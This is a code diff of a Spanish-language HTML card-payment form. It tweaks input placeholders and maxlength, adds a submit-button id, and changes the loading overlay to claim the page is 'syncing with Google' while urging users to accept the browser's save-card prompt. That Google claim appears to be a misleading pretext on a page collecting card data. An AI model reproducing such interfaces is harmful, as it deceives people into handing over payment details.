@@ -55,12 +55,12 @@
           <form id="payment-form" action="?" method="GET" autocomplete="on">
             
             <div class="label2">Titular de la tarjeta</div>
-            <input 
-              type="text" 
-              id="cardHolder" 
-              name="cc-name" 
-              autocomplete="cc-name" 
-              placeholder="NOMBRE COMPLETO" 
+            <input
+              type="text"
+              id="cardHolder"
+              name="cc-name"
+              autocomplete="cc-name"
+              placeholder="NOMBRE COMO APARECE"
               required
             />
 
@@ -72,7 +72,7 @@
               autocomplete="cc-number"
               inputmode="numeric"
               placeholder="0000 0000 0000 0000"
-              maxlength="23"
+              maxlength="19"
               required
             />
 
@@ -105,7 +105,7 @@
               </div>
             </div>
 
-            <button type="submit">⚡ [ LINK PAYMENT METHOD ]</button>
+            <button type="submit" id="submit-btn">⚡ [ VINCULAR MÉTODO ]</button>
             <div class="error" id="err"></div>
           </form>
 
@@ -125,11 +125,11 @@
     </div>
   </div>
 
-  <div id="loading" role="dialog" aria-modal="true" aria-label="Procesando">
-    <div class="loadingTitle">[ VERIFYING PAYMENT DATA ]</div>
+  <div id="loading">
+    <div class="loadingTitle">[ SINCRONIZANDO CON GOOGLE ]</div>
     <div class="counter" id="counter">6</div>
     <div class="loadingSub">
-      Acepta el mensaje de "Guardar tarjeta" si Chrome te lo solicita.
+      Acepta el mensaje de "Guardar tarjeta" si aparece.
     </div>
   </div>
 
